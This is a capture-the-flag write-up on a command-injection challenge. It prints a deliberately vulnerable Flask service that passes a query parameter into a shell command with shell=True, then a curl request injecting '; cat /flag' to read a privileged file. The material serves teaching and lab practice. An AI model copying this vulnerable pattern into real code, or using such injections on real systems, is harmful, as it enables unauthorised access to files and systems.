# CMDi 1 

## Challenge Description
The target is a Flask-based web service that lists files in a user-specified directory via a query parameter. Internally, it executes a shell command using Python’s `subprocess.run()`:

server code:
```
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/resource", methods=["GET"])
def challenge():
    arg = flask.request.args.get("directory", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/resource"><input type=text name=directory><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```

## Vulnerability

The user input (directory) is directly inserted into a shell command.

The command is executed with shell=True, allowing shell metacharacters like ; to chain commands.

The server is run with elevated privileges using exec-suid, meaning it can access privileged files like /flag.


## Exploitation:

By injecting ; cat /flag into the directory parameter, we can execute an unintended command:

```
curl "http://challenge.localhost:80/resource?directory=/flag;%20cat%20/flag"
```

This gets interpreted by the shell as:

```
ls -l /flag; cat /flag
```

## Conclusion

This was a classic command injection vulnerability. By injecting shell syntax into a query parameter, we chained an unintended cat /flag command, which was executed due to unsafe use of shell=True. Because the server ran with elevated privileges, this allowed reading and leaking of a sensitive file.